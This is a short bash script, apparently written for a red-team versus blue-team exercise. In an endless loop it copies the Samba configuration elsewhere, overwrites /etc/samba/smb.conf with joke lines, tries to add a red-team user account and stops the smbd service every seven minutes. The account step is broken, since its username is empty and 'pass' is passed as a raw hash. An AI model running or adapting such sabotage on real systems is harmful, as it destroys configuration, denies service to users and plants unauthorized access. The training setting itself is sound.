#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 #Generate random number, check if the number is even or odd
 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
 #Copy config file to other location, then overwrite original, add users for red team access
   cp '/etc/samba/smb.conf' '/etc/red.conf'
   echo "I'm Batman" > '/etc/samba/smb.conf'
   useradd -m -p "pass" ""
 else
 #Copy config file to other location, then overwrite original, add users for red team access
   cp '/etc/samba/smb.conf' '/home/red.conf'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/samba/smb.conf'
   useradd -m -p "pass" ""
 fi
 #Stop samba service
 sudo service smbd stop
done
